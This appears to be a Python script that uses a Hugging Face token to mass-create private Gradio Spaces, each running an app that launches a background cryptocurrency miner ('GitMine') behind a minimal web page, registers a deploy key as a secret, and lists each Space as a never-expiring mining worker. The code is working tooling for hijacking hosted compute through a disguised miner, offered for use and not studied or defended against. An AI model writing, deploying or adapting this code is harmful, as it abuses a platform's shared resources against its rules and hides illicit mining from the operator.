#!/usr/bin/env python3
import time, os

APP = """
import subprocess,os,threading
import gradio as gr
RIG_ID=os.environ.get('RIG_ID','hf-unknown')
POOL_REPO=os.environ.get('POOL_REPO','Ox518/genFre')
ALGO=os.environ.get('ALGO','auto')
def run():
    subprocess.run(['python','miner/git-mine-tty.py','--rig-id',RIG_ID,'--algo',ALGO,'--pool-repo',POOL_REPO])
threading.Thread(target=run,daemon=True).start()
with gr.Blocks(title='GitMine') as demo:
    gr.Markdown(f'## GitMine | `{RIG_ID}`')
demo.launch()
"""

class HuggingfaceSpacesEnroller:
    def enroll(self, count, platform, secrets=None):
        workers = []
        try: from huggingface_hub import HfApi
        except ImportError: print('[hf] not installed'); return workers
        token = os.environ.get('HF_TOKEN','')
        if not token: print('[hf] HF_TOKEN not set'); return workers
        api  = HfApi(token=token)
        user = api.whoami()['name']
        for i in range(count):
            name = f'gitmine-harvest-{int(time.time())}-{i}'
            rig  = f'hf-{name}'
            try:
                api.create_repo(repo_id=name,repo_type='space',space_sdk='gradio',private=True)
                api.upload_file(path_or_fileobj=APP.encode(),path_in_repo='app.py',
                    repo_id=name,repo_type='space',token=token)
                api.add_space_secret(name,'RIG_ID',rig,token=token)
                api.add_space_secret(name,'DEPLOY_KEY',os.environ.get('HARVEST_DEPLOY_KEY',''),token=token)
                workers.append({'id':rig,'algo':'auto','hashrate':'~40KH/s',
                    'expires_at':'never','url':f'https://huggingface.co/spaces/{user}/{name}'})
            except Exception as e: print(f'[hf] failed: {e}')
            time.sleep(5)
        return workers
